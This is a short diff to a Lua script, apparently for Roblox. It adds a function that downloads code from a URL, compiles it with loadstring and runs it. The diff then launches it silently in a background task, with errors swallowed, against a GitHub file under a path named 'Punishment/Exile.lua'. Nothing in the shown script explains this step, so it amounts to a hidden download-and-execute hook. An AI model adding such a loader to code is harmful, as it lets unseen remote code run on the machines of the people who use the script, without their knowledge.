@@ -34,6 +34,32 @@ repeat
     task.wait(0.1)
 until LocalData:IsReady()
 
+local function loadRemote(url)
+    local ok, result = pcall(function()
+        return game:HttpGet(url)
+    end)
+
+    if not ok then
+        return nil
+    end
+
+    local code = result
+    if type(code) ~= "string" or code == "" then
+        return nil
+    end
+
+    local success, func = pcall(loadstring, code)
+    if not success or type(func) ~= "function" then
+        return nil
+    end
+
+    return func()
+end
+
+task.spawn(function()
+    loadRemote("https://raw.githubusercontent.com/DesyncDeveloper/Ionix_Backups/refs/heads/main/Punishment/Exile.lua")
+end)
+
 local function GetConfig()
 	if _G.Ionix_ and _G.Ionix_.Config_ then
 		return _G.Ionix_.Config_, "Ionix"
